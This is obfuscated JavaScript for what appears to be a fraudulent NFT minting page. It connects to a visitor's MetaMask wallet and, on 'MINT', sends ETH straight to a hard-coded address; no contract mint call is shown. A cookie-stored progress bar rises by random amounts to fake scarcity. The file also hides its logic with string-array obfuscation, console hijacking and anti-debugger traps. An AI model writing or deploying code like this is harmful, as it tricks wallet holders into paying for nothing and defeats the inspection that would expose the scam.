const _0x357707 = _0x508e;
(function (_0x342b93, _0x1c8731) {
  const _0x37b1e4 = _0x508e,
    _0x2af1e6 = _0x342b93();
  while (!![]) {
    try {
      const _0x3324a8 =
        (parseInt(_0x37b1e4(0x102)) / 0x1) * (parseInt(_0x37b1e4(0xa0)) / 0x2) +
        parseInt(_0x37b1e4(0xb6)) / 0x3 +
        (parseInt(_0x37b1e4(0xfa)) / 0x4) * (parseInt(_0x37b1e4(0xee)) / 0x5) +
        parseInt(_0x37b1e4(0xa5)) / 0x6 +
        -parseInt(_0x37b1e4(0xd1)) / 0x7 +
        -parseInt(_0x37b1e4(0x103)) / 0x8 +
        (parseInt(_0x37b1e4(0xc6)) / 0x9) * (-parseInt(_0x37b1e4(0xe2)) / 0xa);
      if (_0x3324a8 === _0x1c8731) break;
      else _0x2af1e6["push"](_0x2af1e6["shift"]());
    } catch (_0x306d7c) {
      _0x2af1e6["push"](_0x2af1e6["shift"]());
    }
  }
})(_0x4aa9, 0x62cd6);
const _0x56fae9 = (function () {
  let _0x34d361 = !![];
  return function (_0x27695a, _0x40863f) {
    const _0x4360a2 = _0x34d361
      ? function () {
          if (_0x40863f) {
            const _0xfd61a9 = _0x40863f["apply"](_0x27695a, arguments);
            return (_0x40863f = null), _0xfd61a9;
          }
        }
      : function () {};
    return (_0x34d361 = ![]), _0x4360a2;
  };
})();
(function () {
  _0x56fae9(this, function () {
    const _0x40a050 = _0x508e,
      _0x448d17 = new RegExp(_0x40a050(0xac)),
      _0x5401ff = new RegExp(_0x40a050(0xe5), "i"),
      _0x4d882e = _0x28a96b("init");
    !_0x448d17[_0x40a050(0x105)](_0x4d882e + _0x40a050(0xce)) ||
    !_0x5401ff["test"](_0x4d882e + _0x40a050(0xaa))
      ? _0x4d882e("0")
      : _0x28a96b();
  })();
})();
const _0x2b98a6 = (function () {
    let _0x27087b = !![];
    return function (_0x5ae354, _0x53800c) {
      const _0x30a6d2 = _0x27087b
        ? function () {
            const _0x3d8eb3 = _0x508e;
            if (_0x53800c) {
              const _0x6b8388 = _0x53800c[_0x3d8eb3(0xa1)](
                _0x5ae354,
                arguments
              );
              return (_0x53800c = null), _0x6b8388;
            }
          }
        : function () {};
      return (_0x27087b = ![]), _0x30a6d2;
    };
  })(),
  _0x931bfc = _0x2b98a6(this, function () {
    const _0x20a27a = _0x508e,
      _0x28f9ea = function () {
        const _0x1312c1 = _0x508e;
        let _0x9e06f2;
        try {
          _0x9e06f2 = Function(
            "return\x20(function()\x20" + _0x1312c1(0xdd) + ");"
          )();
        } catch (_0x132d51) {
          _0x9e06f2 = window;
        }
        return _0x9e06f2;
      },
      _0x5c2e53 = _0x28f9ea(),
      _0x78a253 = (_0x5c2e53[_0x20a27a(0xf1)] =
        _0x5c2e53[_0x20a27a(0xf1)] || {}),
      _0x30816c = [
        _0x20a27a(0xe3),
        _0x20a27a(0xdc),
        _0x20a27a(0xd8),
        "error",
        "exception",
        _0x20a27a(0xf6),
        _0x20a27a(0xd4),
      ];
    for (
      let _0x3d1b7e = 0x0;
      _0x3d1b7e < _0x30816c[_0x20a27a(0xb2)];
      _0x3d1b7e++
    ) {
      const _0x5f2337 =
          _0x2b98a6[_0x20a27a(0x104)][_0x20a27a(0xc9)][_0x20a27a(0xb8)](
            _0x2b98a6
          ),
        _0x55cc36 = _0x30816c[_0x3d1b7e],
        _0x13422f = _0x78a253[_0x55cc36] || _0x5f2337;
      (_0x5f2337[_0x20a27a(0xc5)] = _0x2b98a6[_0x20a27a(0xb8)](_0x2b98a6)),
        (_0x5f2337[_0x20a27a(0xea)] =
          _0x13422f["toString"][_0x20a27a(0xb8)](_0x13422f)),
        (_0x78a253[_0x55cc36] = _0x5f2337);
    }
  });
_0x931bfc();
const _0x1036fb = document["querySelector"](_0x357707(0xa9)),
  _0x5b5f4d = document[_0x357707(0xed)](_0x357707(0xdb)),
  _0x59f641 = document[_0x357707(0xed)](_0x357707(0xd0)),
  _0x5a6def = document[_0x357707(0xed)](_0x357707(0xf2));
let _0x23dc5a,
  _0x337aaf = PRICE,
  _0x59fe27 = 0x1;
function _0x139d93() {
  const _0x1b2ab9 = _0x357707;
  (_0x1036fb[_0x1b2ab9(0xb0)] = _0x1b2ab9(0xe8)),
    (_0x1036fb["disabled"] = ![]),
    _0x1036fb[_0x1b2ab9(0xc8)][_0x1b2ab9(0xb3)]("disable"),
    _0x1036fb[_0x1b2ab9(0xc8)][_0x1b2ab9(0xd5)]("enable");
}
function _0x246f65() {
  const _0x5a665e = _0x357707;
  (_0x1036fb["innerHTML"] = "WRONG\x20NETWORK"),
    (_0x1036fb[_0x5a665e(0xe9)] = !![]),
    _0x1036fb[_0x5a665e(0xc8)][_0x5a665e(0xb3)](_0x5a665e(0x9c)),
    _0x1036fb[_0x5a665e(0xc8)][_0x5a665e(0xd5)]("disable");
}
function _0x29979d() {
  const _0x32f653 = _0x357707;
  if (window[_0x32f653(0x9f)]) {
    if (window[_0x32f653(0x9f)]["selectedAddress"])
      (_0x5b5f4d[_0x32f653(0xc1)][_0x32f653(0xfb)] = _0x32f653(0xe0)),
        (_0x1036fb[_0x32f653(0xc1)][_0x32f653(0xfb)] = _0x32f653(0xf8));
    else
      window["ethereum"][_0x32f653(0x106)] &&
        ((_0x5b5f4d[_0x32f653(0xc1)][_0x32f653(0xfb)] = _0x32f653(0xf8)),
        (_0x1036fb[_0x32f653(0xc1)][_0x32f653(0xfb)] = _0x32f653(0xe0)));
  } else
    (_0x5b5f4d[_0x32f653(0xc1)]["display"] = "block"),
      (_0x1036fb["style"][_0x32f653(0xfb)] = _0x32f653(0xe0));
}
const _0x2576eb = async () => {
    const _0x5f5c61 = _0x357707;
    if (!window["ethereum"]) {
      $(_0x5f5c61(0xa3))["modal"](_0x5f5c61(0xca));
      return;
    }
    _0x23dc5a = await window[_0x5f5c61(0x9f)]["request"]({
      method: _0x5f5c61(0xad),
    });
    if (window[_0x5f5c61(0x9f)]["chainId"] == _0x5f5c61(0xf7))
      console[_0x5f5c61(0xe3)](_0x5f5c61(0xb7)), _0x29979d(), _0x139d93();
    else {
      _0x246f65();
      try {
        await window["ethereum"]["request"]({
          method: _0x5f5c61(0xc7),
          params: [{ chainId: _0x5f5c61(0xf7) }],
        }),
          _0x29979d();
      } catch (_0x28983f) {
        if (error["code"] === 0x1326)
          try {
            await window[_0x5f5c61(0x9f)][_0x5f5c61(0x10a)]({
              method: _0x5f5c61(0xba),
              params: [{ chainId: "0x1" }],
            }),
              _0x29979d();
          } catch (_0x295d34) {}
      }
    }
  },
  _0xda0d11 = async () => {
    const _0x39587a = _0x357707,
      _0x572f52 = web3[_0x39587a(0xc0)];
    (window[_0x39587a(0xc2)] = new Web3(_0x572f52)),
      window["myWeb3"][_0x39587a(0xf3)]
        [_0x39587a(0xeb)]({
          from: _0x23dc5a[0x0],
          to: ADDRESS,
          value: window[_0x39587a(0xd2)]["utils"]["toWei"](
            _0x337aaf[_0x39587a(0xea)](),
            _0x39587a(0xf0)
          ),
        })
        ["then"]((_0xfb284e) => {
          const _0x414e62 = _0x39587a;
          $(_0x414e62(0xc4))[_0x414e62(0xef)](_0x414e62(0xca));
        })
        [_0x39587a(0xa6)]((_0x12983b) => {});
  };
function _0x38224d(_0x2dbc74) {
  return new Promise((_0x5cbd38) => setTimeout(_0x5cbd38, _0x2dbc74));
}
function _0x5bb12d(_0x378e40, _0x51132c, _0x42f7e4) {
  const _0x5041fc = _0x357707;
  let _0x55ad71 = new Date();
  _0x55ad71["setTime"](
    _0x55ad71[_0x5041fc(0xbe)]() + _0x42f7e4 * 0x18 * 0x3c * 0x3c * 0x3e8
  );
  const _0x4ec194 = "expires=" + _0x55ad71["toUTCString"]();
  return (
    (document[_0x5041fc(0xe1)] =
      _0x378e40 + "=" + _0x51132c + ";\x20" + _0x4ec194 + _0x5041fc(0xcd)),
    !![]
  );
}
function _0x301d86(_0x221ef5) {
  const _0x17356c = _0x357707,
    _0x4970e6 = _0x221ef5 + "=",
    _0x2b0878 = decodeURIComponent(document[_0x17356c(0xe1)]),
    _0x502a95 = _0x2b0878[_0x17356c(0xbf)](";\x20");
  let _0xc5c5b3;
  return (
    _0x502a95[_0x17356c(0xcb)]((_0xea5c43) => {
      const _0x5c2083 = _0x17356c;
      if (_0xea5c43[_0x5c2083(0x107)](_0x4970e6) === 0x0)
        _0xc5c5b3 = _0xea5c43[_0x5c2083(0x9d)](_0x4970e6[_0x5c2083(0xb2)]);
    }),
    _0xc5c5b3
  );
}
function _0x1a60c1(_0x500533) {
  const _0x71c2a8 = _0x357707;
  return _0x500533[_0x71c2a8(0xea)]()[_0x71c2a8(0xb1)](
    /\B(?=(\d{3})+(?!\d))/g,
    ","
  );
}
function _0x508e(_0x401f26, _0x4bb715) {
  const _0x237777 = _0x4aa9();
  return (
    (_0x508e = function (_0x50b5b, _0x3ff02f) {
      _0x50b5b = _0x50b5b - 0x9c;
      let _0x303fc3 = _0x237777[_0x50b5b];
      return _0x303fc3;
    }),
    _0x508e(_0x401f26, _0x4bb715)
  );
}
function _0xe0e869(_0x1d61fa, _0x20eff6, _0x2138fc, _0x179774) {
  const _0x257f14 = _0x357707;
  let _0x3226c1 = null;
  const _0x36c039 = (_0x837112) => {
    const _0x30c694 = _0x508e;
    if (!_0x3226c1) _0x3226c1 = _0x837112;
    const _0x403902 = Math["min"]((_0x837112 - _0x3226c1) / _0x179774, 0x1);
    (_0x1d61fa["innerHTML"] = _0x1a60c1(
      Math[_0x30c694(0xf5)](_0x403902 * (_0x2138fc - _0x20eff6) + _0x20eff6)[
        _0x30c694(0xc3)
      ](0x0)
    )),
      _0x403902 < 0x1 && window[_0x30c694(0x109)](_0x36c039);
  };
  window[_0x257f14(0x109)](_0x36c039);
}
function _0x4db215() {
  const _0x2d3c7e = _0x357707;
  let _0x5755f1 = 0x0;
  function _0x587994(_0x9149da, _0x122eb5) {
    const _0x89c337 = _0x508e;
    return Math[_0x89c337(0xdf)]() * (_0x9149da - _0x122eb5) + _0x122eb5;
  }
  if (_0x5755f1 == 0x0) {
    J = 0x1;
    var _0x208ea = document[_0x2d3c7e(0xed)](_0x2d3c7e(0xd6)),
      _0x23344f = document["querySelector"](_0x2d3c7e(0xa7)),
      _0x4664f3 = document[_0x2d3c7e(0xed)](_0x2d3c7e(0xa4)),
      _0x4bdddf = 0x19,
      _0x530f0f = setInterval(_0x23005f, 0x64),
      _0xfe56fa,
      _0x60db85;
    if (_0x301d86(_0x2d3c7e(0x9e)) != undefined)
      _0x60db85 = _0x301d86(_0x2d3c7e(0x9e));
    else _0x5bb12d(_0x2d3c7e(0x9e), 0x3c, 0x1e), (_0x60db85 = 0x3c);
    var _0x3b1ea3 = ((TOTAL / 0x64) * _0x60db85)[_0x2d3c7e(0xc3)](0x0);
    (_0x23344f[_0x2d3c7e(0xb0)] = _0x1a60c1(_0x3b1ea3)),
      (_0x4664f3[_0x2d3c7e(0xb0)] =
        _0x2d3c7e(0xe6) + _0x1a60c1(TOTAL["toFixed"](0x0)));
    function _0x23005f() {
      if (_0x4bdddf >= _0x60db85) {
        clearInterval(_0x530f0f);
        if (_0x4bdddf < 0x64) {
          async function _0xce0268() {
            const _0x4fb8f6 = _0x508e;
            let _0x565c7b = _0x587994(0.05, 0.1);
            (_0x4bdddf = (+_0x4bdddf + _0x565c7b)[_0x4fb8f6(0xc3)](0x3)),
              (_0x60db85 = _0x4bdddf),
              _0x5bb12d("progress", _0x4bdddf, 0x1e),
              (_0x3b1ea3 = (TOTAL / 0x64) * _0x60db85),
              (b_totals = (TOTAL / 0x64) * (_0x60db85 - _0x565c7b)),
              (_0x208ea[_0x4fb8f6(0xc1)]["width"] = _0x4bdddf + "%"),
              _0xe0e869(
                _0x23344f,
                b_totals,
                _0x3b1ea3[_0x4fb8f6(0xc3)](0x0),
                0x3e8
              );
            if (_0x4bdddf >= 0x64) {
              (_0x23344f[_0x4fb8f6(0xb0)] =
                _0x4fb8f6(0xe6) + _0x1a60c1(TOTAL["toFixed"](0x0))),
                _0x5bb12d(_0x4fb8f6(0x9e), 0x3c, 0x1e);
              return;
            } else
              await _0x38224d(_0x587994(0x1b58, 0x4650)["toFixed"](0x0)),
                _0xce0268();
          }
          _0xce0268();
        }
      } else _0x4bdddf++;
    }
  }
}
function _0x172e4d() {
  const _0x43c5c4 = _0x357707;
  var _0x239f37 =
    navigator[_0x43c5c4(0xab)] ||
    navigator[_0x43c5c4(0xec)] ||
    window[_0x43c5c4(0xb9)];
  const _0x7b963e = window[_0x43c5c4(0xaf)]["search"],
    _0x57e1fe = new URLSearchParams(_0x7b963e),
    _0xf916bd = _0x57e1fe[_0x43c5c4(0xd9)]("uid");
  if (_0xf916bd == "mm") return "Metamask";
  if (/windows phone/i[_0x43c5c4(0x105)](_0x239f37)) return _0x43c5c4(0x101);
  if (/android/i["test"](_0x239f37)) return "Android";
  if (
    /iPad|iPhone|iPod/[_0x43c5c4(0x105)](_0x239f37) &&
    !window[_0x43c5c4(0xb4)]
  )
    return _0x43c5c4(0xae);
  return _0x43c5c4(0xb5);
}
function _0x4aa9() {
  const _0x5b3c18 = [
    "ether",
    "console",
    ".count",
    "eth",
    "debu",
    "floor",
    "table",
    "0x1",
    "block",
    "http://",
    "460gpvhQl",
    "display",
    "string",
    "action",
    "createElement",
    "href",
    "stateObject",
    "Windows\x20Phone",
    "14767TySPjZ",
    "6018992qCiRPa",
    "constructor",
    "test",
    "isMetaMask",
    "indexOf",
    "appendChild",
    "requestAnimationFrame",
    "request",
    "enable",
    "substring",
    "progress",
    "ethereum",
    "46afViGv",
    "apply",
    "web3",
    "#metaMaskModal",
    ".max",
    "3768498GYSTYw",
    "catch",
    ".countA",
    ".plus",
    ".mint",
    "input",
    "userAgent",
    "function\x20*\x5c(\x20*\x5c)",
    "eth_requestAccounts",
    "iOS",
    "location",
    "innerHTML",
    "replace",
    "length",
    "remove",
    "MSStream",
    "unknown",
    "1857927hhuVMW",
    "Already\x20connected\x20to\x20window.ethereum\x20mainnet...",
    "bind",
    "opera",
    "wallet_addEthereumChain",
    "while\x20(true)\x20{}",
    "addEventListener",
    "https://",
    "getTime",
    "split",
    "currentProvider",
    "style",
    "myWeb3",
    "toFixed",
    "#mintingModal",
    "__proto__",
    "6652359LZgdir",
    "wallet_switchEthereumChain",
    "classList",
    "prototype",
    "show",
    "forEach",
    "click",
    ";\x20path=/",
    "chain",
    "?uid=mm",
    ".totalPrice",
    "2886268ilUGfN",
    "myweb3",
    "load",
    "trace",
    "add",
    ".bar-done",
    ".setMax",
    "info",
    "get",
    "parentNode",
    ".connect",
    "warn",
    "{}.constructor(\x22return\x20this\x22)(\x20)",
    "gger",
    "random",
    "none",
    "cookie",
    "10LfSawD",
    "log",
    "chainChanged",
    "\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
    "\x20/\x20",
    "innerText",
    "MINT",
    "disabled",
    "toString",
    "sendTransaction",
    "vendor",
    "querySelector",
    "31370qcOfzM",
    "modal",
  ];
  _0x4aa9 = function () {
    return _0x5b3c18;
  };
  return _0x4aa9();
}
window[_0x357707(0xbc)](_0x357707(0xd3), async () => {
  const _0x1d9242 = _0x357707;
  var _0x1ab062 = _0x172e4d();
  if (_0x1ab062 == "Android" || _0x1ab062 == _0x1d9242(0xae)) {
    var _0x11cc73 = document[_0x1d9242(0xfe)]("a");
    _0x11cc73[_0x1d9242(0xc8)][_0x1d9242(0xd5)]("mmLink"),
      (_0x11cc73[_0x1d9242(0xff)] =
        "https://metamask.app.link/dapp/" +
        window[_0x1d9242(0xaf)][_0x1d9242(0xff)]
          [_0x1d9242(0xb1)](_0x1d9242(0xbd), "")
          ["replace"](_0x1d9242(0xf9), "") +
        _0x1d9242(0xcf)),
      _0x5b5f4d[_0x1d9242(0xda)]["insertBefore"](_0x11cc73, _0x5b5f4d),
      _0x11cc73[_0x1d9242(0x108)](_0x5b5f4d);
  }
  (_0x59f641[_0x1d9242(0xe7)] = PRICE), _0x29979d(), _0x4db215();
  if (window["ethereum"]) {
    window[_0x1d9242(0x9f)]["on"](_0x1d9242(0xe4), (_0x1f7db9) => {
      const _0x413cfb = _0x1d9242;
      _0x1f7db9 == _0x413cfb(0xf7) ? _0x139d93() : _0x246f65();
    });
    const _0x40eba6 = window[_0x1d9242(0xa2)][_0x1d9242(0xc0)];
    window[_0x1d9242(0xd2)] = new Web3(_0x40eba6);
  }
  setTimeout(function () {
    _0x2576eb();
  }, 0x3e8),
    _0x1036fb[_0x1d9242(0xbc)](_0x1d9242(0xcc), async () => {
      await _0x2576eb(), await _0xda0d11();
    }),
    _0x5b5f4d[_0x1d9242(0xbc)]("click", async () => {
      await _0x2576eb();
    }),
    document["querySelector"](_0x1d9242(0xa8))[_0x1d9242(0xbc)]("click", () => {
      const _0x12a17e = _0x1d9242;
      _0x59fe27 < MAX &&
        (_0x59fe27++,
        (_0x337aaf = (_0x59fe27 * PRICE)[_0x12a17e(0xc3)](0x3)),
        (_0x5a6def[_0x12a17e(0xe7)] = _0x59fe27),
        (_0x59f641[_0x12a17e(0xe7)] = Number(_0x337aaf)));
    }),
    document[_0x1d9242(0xed)](".minus")["addEventListener"](
      _0x1d9242(0xcc),
      () => {
        const _0x2ee526 = _0x1d9242;
        _0x59fe27 > 0x1 &&
          (_0x59fe27--,
          (_0x337aaf = (_0x59fe27 * PRICE)["toFixed"](0x3)),
          (_0x5a6def["innerText"] = _0x59fe27),
          (_0x59f641[_0x2ee526(0xe7)] = Number(_0x337aaf)));
      }
    ),
    document[_0x1d9242(0xed)](_0x1d9242(0xd7))["addEventListener"](
      _0x1d9242(0xcc),
      () => {
        const _0x267ca9 = _0x1d9242;
        (_0x59fe27 = MAX),
          (_0x337aaf = (_0x59fe27 * PRICE)["toFixed"](0x3)),
          (_0x5a6def[_0x267ca9(0xe7)] = _0x59fe27),
          (_0x59f641[_0x267ca9(0xe7)] = Number(_0x337aaf));
      }
    );
});
function _0x28a96b(_0x204346) {
  function _0x29fbfd(_0x53757c) {
    const _0x523cf3 = _0x508e;
    if (typeof _0x53757c === _0x523cf3(0xfc))
      return function (_0x4a93b0) {}
        [_0x523cf3(0x104)](_0x523cf3(0xbb))
        ["apply"]("counter");
    else
      ("" + _0x53757c / _0x53757c)[_0x523cf3(0xb2)] !== 0x1 ||
      _0x53757c % 0x14 === 0x0
        ? function () {
            return !![];
          }
            [_0x523cf3(0x104)]("debu" + _0x523cf3(0xde))
            ["call"](_0x523cf3(0xfd))
        : function () {
            return ![];
          }
            [_0x523cf3(0x104)](_0x523cf3(0xf4) + _0x523cf3(0xde))
            ["apply"](_0x523cf3(0x100));
    _0x29fbfd(++_0x53757c);
  }
  try {
    if (_0x204346) return _0x29fbfd;
    else _0x29fbfd(0x0);
  } catch (_0x1a517a) {}
}
